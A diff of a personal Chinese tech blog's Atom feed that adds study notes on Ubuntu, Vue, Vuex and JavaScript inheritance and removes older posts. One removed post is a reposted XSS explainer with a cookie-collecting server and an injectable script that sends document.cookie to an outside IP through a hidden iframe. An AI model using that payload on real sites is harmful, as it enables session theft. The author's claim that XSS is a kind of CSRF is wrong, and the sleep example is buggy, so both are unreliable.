@@ -5,7 +5,7 @@
   <link href="/blog/atom.xml" rel="self"/>
   
   <link href="https://ganchengyuan1990.github.io/blog/"/>
-  <updated>2017-03-10T09:22:30.575Z</updated>
+  <updated>2017-03-27T01:11:17.603Z</updated>
   <id>https://ganchengyuan1990.github.io/blog/</id>
   
   <author>
@@ -14,6 +14,107 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Ubantu新服务器搭建</title>
+    <link href="https://ganchengyuan1990.github.io/blog/2017/03/22/Ubantu%E6%96%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
+    <id>https://ganchengyuan1990.github.io/blog/2017/03/22/Ubantu新服务器搭建/</id>
+    <published>2017-03-22T07:00:33.000Z</published>
+    <updated>2017-03-27T01:11:17.603Z</updated>
+    
+    <content type="html"><![CDATA[<p>今日新开一个Ubantu服务器，先来学习。</p>
+<p>yum操作</p>
+<p>yum，是Yellow dog Updater, Modified 的简称，是杜克大学为了提高RPM 软件包安装性而开发的一种软件包管理器。起初是由yellow dog 这一发行版的开发者Terra Soft 研发，用python 写成，那时还叫做yup(yellow dog updater)，后经杜克大学的Linux@Duke 开发团队进行改进，遂有此名。yum 的宗旨是自动化地升级，安装/移除rpm 包，收集rpm 包的相关信息，检查依赖性并自动提示用户解决。yum 的关键之处是要有可靠的repository，顾名思义，这是软件的仓库，它可以是http 或ftp 站点，也可以是本地软件池，但必须包含rpm 的header，header 包括了rpm 包的各种信息，包括描述，功能，提供的文件，依赖性等。正是收集了这些header 并加以分析，才能自动化地完成余下的任务。</p>
+<p>nginx安装<br>这个比在windows系统下要麻烦得多，需要依次安装PCRE/zlib等依赖包。</p>
+<p>node.js<br>全局变量global</p>
+<hr>
+<a id="more"></a>
+<p>Webpack:<br>再来看看CommonsChunkPlugin 的其他配置选项：</p>
+<p>minChunks：公共模块被使用的最小次数。比如配置为3，也就是同一个模块只有被3个以外的页面同时引用时才会被提取出来作为common chunks。</p>
+<p>什么时候用VUEX，什么时候用props？<br>Vuex实际上是类Flux的数据管理架构。它主要帮我们更好的组织代码，更好的让Vue中的状态更好的通过状态管理维护起来。在实际项目运用中我们需要对组件的组件本地状态(component local state)和应用层级状态(application level state)进行区分。<br>Vuex的作用就是汇集应用层级的状态到一处，方便管理。</p>
+<p>所以，如果只需要单向传递，比如父组件向子组件，那么使用props即可，加入需要隔层或者反向传递（子组件传向父组件），那么就用vuex。</p>
+<hr>
+<p>function d({name = “Jason”, age = “24”} = {}) {<br>    return <code>${name} ${age}</code>;<br>}<br>console.log(d({}))</p>
+<hr>
+<p>当代码在一个环境中执行时，会创建变量对象的一个作用域链，作用域链保证对执行环境有权访问的所有变量和函数的有序访问。</p>
+<p>一般地，内部环境可以通过作用域链访问所有的外部环境。</p>
+<p>作用域链本质上是一个指向变量对象的指针列表，它只引用但不实际包含变量对象。</p>
+<p>无论什么时候在函数中访问一个变量时，就会从作用域链中搜索具有相应名字的变量。</p>
+<hr>
+<p>没想到ES7都出来了，学习一下sleep和async</p>
+<p>const sleep = (timeountMS) =&gt; new Promise((resolve) =&gt; {<br>    setTimeout(resolve(123123), timeountMS);<br>});</p>
+<p>const testAsync = async() =&gt; {<br>    const t = sleep(1000);<br>    console.log(t);<br>}</p>
+<p>testAsync();</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;今日新开一个Ubantu服务器，先来学习。&lt;/p&gt;
+&lt;p&gt;yum操作&lt;/p&gt;
+&lt;p&gt;yum，是Yellow dog Updater, Modified 的简称，是杜克大学为了提高RPM 软件包安装性而开发的一种软件包管理器。起初是由yellow dog 这一发行版的开发者Terra Soft 研发，用python 写成，那时还叫做yup(yellow dog updater)，后经杜克大学的Linux@Duke 开发团队进行改进，遂有此名。yum 的宗旨是自动化地升级，安装/移除rpm 包，收集rpm 包的相关信息，检查依赖性并自动提示用户解决。yum 的关键之处是要有可靠的repository，顾名思义，这是软件的仓库，它可以是http 或ftp 站点，也可以是本地软件池，但必须包含rpm 的header，header 包括了rpm 包的各种信息，包括描述，功能，提供的文件，依赖性等。正是收集了这些header 并加以分析，才能自动化地完成余下的任务。&lt;/p&gt;
+&lt;p&gt;nginx安装&lt;br&gt;这个比在windows系统下要麻烦得多，需要依次安装PCRE/zlib等依赖包。&lt;/p&gt;
+&lt;p&gt;node.js&lt;br&gt;全局变量global&lt;/p&gt;
+&lt;hr&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>VUE&amp;REACT</title>
+    <link href="https://ganchengyuan1990.github.io/blog/2017/03/14/VUE-REACT/"/>
+    <id>https://ganchengyuan1990.github.io/blog/2017/03/14/VUE-REACT/</id>
+    <published>2017-03-14T01:18:51.000Z</published>
+    <updated>2017-03-17T02:10:00.965Z</updated>
+    
+    <content type="html"><![CDATA[<p>Vue中props的用法总结：</p>
+<ol>
+<li><p>父组件中传递props给子组件, <child :order-time="canfig.orderTime"></child>，然后子组件中的props中可以收到props: [‘orderTime’]，当然这是单向传递的。</p>
+</li>
+<li><p>如果想让子组件修改的属性能够同步到父组件中，那么在父组件中的传递要改为<child :order-time.sync="canfig.orderTime"></child>.</p>
+</li>
+</ol>
+<p>REACT中渲染页面：<br>1.JSX中用this.state的属性值渲染，reducer处理state后通过触发redux的mapStateToProps函数，赋新值给props，然后触发了react的生命周期函数componentWillReceiveProps，在里面重新去setState，从而re-render。</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>###ES6语法深入学习<br>Object.create()：该方法是ECMAScript5中新增的，可以理解为规范化JS中的原型式继承。<br>这个方法接收两个参数，一个是用作新对象原型的对象，和一个为新对象定义额外属性的（可选）对象。</p>
+<p>let为何解决了闭包循环问题？<br>let声明的变量直到控制流到达该变量被定义的代码行时才会被装载，所以在到达之前使用该变量会触发错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">function update() &#123;</div><div class="line">     console.log(&quot;当前时间:&quot;, t);  // 引用错误（ReferenceError）</div><div class="line">     ...</div><div class="line">     let t = readTachymeter();</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
+<p>let因为定义了变量的块级作用域（就是最邻近的大括号之间），所以要在全部执行完以后才会回收。而ES5之前只能由函数来定义作用域，所以循环内部无法形成作用域，所以必须用自执行函数制造一个闭包。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">for(let i = 0; i &lt; arr.length; i++) &#123;</div><div class="line">    setTimeout(() =&gt; &#123;</div><div class="line">        alert(i);</div><div class="line">    &#125;, arr[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这里有一篇文章说的好<a href="https://johanzhu.github.io/2016/09/26/ten/" target="_blank" rel="external">https://johanzhu.github.io/2016/09/26/ten/</a></p>
+<hr>
+<p>###css transition属性<br>过渡属性，最后一个参数表示停顿多久后开始<br>-webkit-transition:background 2s linear 1s; </p>
+<hr>
+<p>JS继承的方式:</p>
+<ol>
+<li><p>原型链继承  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">function Parent()&#123;</div><div class="line">    this.name = &apos;mike&apos;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function Child()&#123;</div><div class="line">    this.age = 12;</div><div class="line">&#125;</div><div class="line">Child.prototype = new Parent();//Child继承Parent，通过原型，形成链条</div></pre></td></tr></table></figure>
+</li>
+<li><p>构造函数继承（借助call）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">function Parent(age)&#123;</div><div class="line">    this.name = [&apos;mike&apos;,&apos;jack&apos;,&apos;smith&apos;];</div><div class="line">    this.age = age;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function Child(age)&#123;</div><div class="line">    Parent.call(this,age);</div><div class="line">&#125;</div><div class="line">var test = new Child(21);</div><div class="line">alert(test.age);//21</div><div class="line">alert(test.name);//mike,jack,smith</div><div class="line">test.name.push(&apos;bill&apos;);</div><div class="line">alert(test.name);//mike,jack,smith,bill</div></pre></td></tr></table></figure>
+</li>
+<li><p>组合继承</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">function Parent(name)&#123;</div><div class="line">    this.name = name;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Parent.prototype.sayName = function() &#123;</div><div class="line">  return this.name + &quot;!!!!&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function Child(name)&#123;</div><div class="line">  debugger</div><div class="line">    this.age = 12;</div><div class="line">    Parent.call(this, name);</div><div class="line">&#125;</div><div class="line"></div><div class="line">Child.prototype = new Parent();</div><div class="line">var test = new Child(&quot;Jason&quot;)</div><div class="line">console.log(test);</div></pre></td></tr></table></figure>
+<p>所以说，一般来讲就只需要把funtion放到prototype中，变量放在构造函数中</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Vue中props的用法总结：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;父组件中传递props给子组件, &lt;child  :order-time=&quot;canfig.orderTime&quot;&gt;&lt;/child&gt;，然后子组件中的props中可以收到props: [‘orderTime’]，当然这是单向传递的。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;如果想让子组件修改的属性能够同步到父组件中，那么在父组件中的传递要改为&lt;child  :order-time.sync=&quot;canfig.orderTime&quot;&gt;&lt;/child&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;REACT中渲染页面：&lt;br&gt;1.JSX中用this.state的属性值渲染，reducer处理state后通过触发redux的mapStateToProps函数，赋新值给props，然后触发了react的生命周期函数componentWillReceiveProps，在里面重新去setState，从而re-render。&lt;/p&gt;
+&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>2017/03/10总结</title>
@@ -863,64 +964,6 @@
     
     
       <category term="后端" scheme="https://ganchengyuan1990.github.io/blog/tags/%E5%90%8E%E7%AB%AF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ZT- Js载入defer和async方式的区别</title>
-    <link href="https://ganchengyuan1990.github.io/blog/2017/01/19/Js-%E8%BD%BD%E5%85%A5defer%E5%92%8Casync%E6%96%B9%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
-    <id>https://ganchengyuan1990.github.io/blog/2017/01/19/Js-载入defer和async方式的区别/</id>
-    <published>2017-01-19T06:06:49.000Z</published>
-    <updated>2017-02-10T11:00:44.962Z</updated>
-    
-    <content type="html"><![CDATA[<p>async加载完便执行，乱序的；defer会等到html解析完再执行，并且是顺序的。</p>
-<ol>
-<li>defer 和 async 在网络读取（下载）这块儿是一样的，都是异步的（相较于 HTML 解析）</li>
-<li>它俩的差别在于脚本下载完之后何时执行，显然 defer 是最接近我们对于应用脚本加载和执行的要求的</li>
-<li>关于 defer，此图未尽之处在于它是按照加载顺序执行脚本的，这一点要善加利用</li>
-<li>async 则是一个乱序执行的主，反正对它来说脚本的加载和执行是紧紧挨着的，所以不管你声明的顺序如何，只要它加载完了就会立刻执行</li>
-<li>仔细想想，async 对于应用脚本的用处不大，因为它完全不考虑依赖（哪怕是最低级的顺序执行），不过它对于那些可以不依赖任何脚本或不被任何脚本依赖的脚本来说却是非常合适的，最典型的例子：Google Analytics</li>
-</ol>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;async加载完便执行，乱序的；defer会等到html解析完再执行，并且是顺序的。&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;defer 和 async 在网络读取（下载）这块儿是一样的，都是异步的（相较于 HTML 解析）&lt;/li&gt;
-&lt;li&gt;它俩的差别在于脚本下载完之后何时执行，显然 
-    
-    </summary>
-    
-    
-      <category term="Javascript" scheme="https://ganchengyuan1990.github.io/blog/tags/Javascript/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ZT-XSS和CSRF对比</title>
-    <link href="https://ganchengyuan1990.github.io/blog/2017/01/19/XSS%E5%92%8CCSRF%E5%AF%B9%E6%AF%94/"/>
-    <id>https://ganchengyuan1990.github.io/blog/2017/01/19/XSS和CSRF对比/</id>
-    <published>2017-01-19T01:11:30.000Z</published>
-    <updated>2017-02-10T11:01:02.923Z</updated>
-    
-    <content type="html"><![CDATA[<font color="grey">转载：<a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/" target="_blank" rel="external">https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/</a></font>
-
-<h2 id="XSS：脚本中的不速之客"><a href="#XSS：脚本中的不速之客" class="headerlink" title="XSS：脚本中的不速之客"></a>XSS：脚本中的不速之客</h2><p>XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。</p>
-<p>运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</div><div class="line">    alert(<span class="string">"你关不掉我~"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line">&lt;!-- more --&gt;</div><div class="line"></div><div class="line"></div><div class="line">跨站脚本注入的信息收集服务器</div><div class="line"></div><div class="line">"""javascript</div><div class="line"><span class="keyword">import</span> bottle</div><div class="line"></div><div class="line">app = bottle.Bottle()</div><div class="line">plugin = bottle.ext.sqlite.Plugin(dbfile=<span class="string">'/var/db/myxss.sqlite'</span>)</div><div class="line">app.install(plugin)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/myxss/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(cookies, db)</span>:</span></div><div class="line">    SQL = <span class="string">'INSERT INTO "myxss" ("cookies") VALUES (?)'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        db.execute(SQL, cookies)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
-<p>然后在某一个页面的评论中注入这段代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt;  包起来放在评论中</span></div><div class="line"></div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</div><div class="line">    <span class="comment">// 构造泄露信息用的 URL</span></div><div class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</div><div class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</div><div class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</div><div class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></div><div class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</div><div class="line">    hideFrame.height = <span class="number">0</span>;</div><div class="line">    hideFrame.width = <span class="number">0</span>;</div><div class="line">    hideFrame.style.display = <span class="string">"none"</span>;</div><div class="line">    hideFrame.src = xssURI;</div><div class="line">    <span class="comment">// 开工</span></div><div class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</div><div class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</div></pre></td></tr></table></figure></p>
-<font color="red">个人总结：XSS是CSRF中的一种，是特指通过执行JS脚本来进行的攻击。CSRF则方式更多，比如通过代码中的逻辑问题去进行攻击，黑客通过伪装成用户进行攻击。</font>]]></content>
-    
-    <summary type="html">
-    
-      &lt;font color=&quot;grey&quot;&gt;转载：&lt;a href=&quot;https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://blog.tonyse
-    
-    </summary>
-    
-    
-      <category term="网络相关" scheme="https://ganchengyuan1990.github.io/blog/tags/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3/"/>
     
   </entry>
   
